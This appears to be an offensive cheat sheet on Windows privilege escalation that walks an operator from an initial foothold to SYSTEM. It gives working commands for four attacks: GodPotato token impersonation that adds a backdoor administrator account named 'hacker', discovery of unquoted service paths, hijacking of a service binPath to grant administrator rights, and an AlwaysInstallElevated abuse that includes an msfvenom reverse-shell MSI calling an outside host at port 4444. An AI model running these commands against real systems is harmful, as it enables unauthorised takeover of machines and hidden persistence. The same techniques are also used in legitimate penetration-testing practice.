# 🪟 Windows Privilege Escalation Playbook

Once an initial unprivileged foothold is obtained on a Windows system, privilege escalation allows an operator to elevate privileges to `NT AUTHORITY\SYSTEM` or local `Administrator`.

---

### Triage & Initial Enumeration

```cmd
:: Current user identity and active privileges
whoami /all

:: Operating system version and architecture
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

:: Local administrator group members
net localgroup administrators

:: Network connections and listening ports
netstat -ano | findstr LISTENING
```

---

### Attack Vector 1: Token Impersonation (`SeImpersonatePrivilege`)

#### Theoretical Mechanics
Accounts running network services (e.g. `IIS APPPOOL\DefaultAppPool`, `LOCAL SERVICE`, `NETWORK SERVICE`, `MSSQLSERVER`) frequently hold **`SeImpersonatePrivilege`** or **`SeAssignPrimaryTokenPrivilege`**. 

These privileges permit a process to impersonate the security context of any token passed to it by an authenticated client. Using "Potato" family exploits (GodPotato, SweetPotato, BadPotato), the tool tricks a high-privileged system service (running as `NT AUTHORITY\SYSTEM` via RPC, DCOM, or named pipes) into authenticating to a local rogue listener, captures the `SYSTEM` token, and duplicates it.

```cmd
:: Verify privilege is present
whoami /priv | findstr SeImpersonatePrivilege

:: Execute command as NT AUTHORITY\SYSTEM using GodPotato
GodPotato-NET4.exe -cmd "cmd.exe /c net user hacker Admin123! /add && net localgroup administrators hacker /add"
```

---

### Attack Vector 2: Unquoted Service Paths

#### Vulnerability Condition
When a Windows service executable path contains spaces and is **not enclosed in double quotation marks** (e.g., `C:\Program Files\Custom App\Service.exe`), Windows attempts to resolve the binary sequentially:
1. `C:\Program.exe`
2. `C:\Program Files\Custom.exe`
3. `C:\Program Files\Custom App\Service.exe`

If an unprivileged user has write access to any intermediate folder (e.g., `C:\Program Files\Custom App\`), they can drop a malicious binary named `Service.exe` or `Custom.exe` that executes when the service restarts.

```cmd
:: Find unquoted service paths using wmic
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

:: Check directory write permissions using icacls
icacls "C:\Program Files\Custom App"
```

---

### Attack Vector 3: Weak Service Permissions

If an unprivileged user has permission to modify service configurations (`SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG`), they can modify the service's `binPath` to point to a malicious executable and restart the service:

```cmd
:: Check service configuration rights with accesschk
accesschk.exe -ucqv user vulnerable_service

:: Overwrite the service binary path to add a new administrator
sc config vulnerable_service binPath= "net localgroup Administrators jdoe /add"

:: Restart the service to execute with SYSTEM privileges
sc stop vulnerable_service
sc start vulnerable_service
```

---

### Attack Vector 4: AlwaysInstallElevated Registry Key

If the `AlwaysInstallElevated` registry policy is enabled, Windows Installer runs all `.msi` installations with full `NT AUTHORITY\SYSTEM` privileges, even when initiated by a low-privileged user.

```cmd
:: Check if AlwaysInstallElevated is set to 1 in both HKLM and HKCU
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: If both return 0x1, generate malicious MSI payload with msfvenom
:: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o update.msi

:: Run installer silently as regular user (executes as SYSTEM)
msiexec /quiet /qn /i update.msi
```
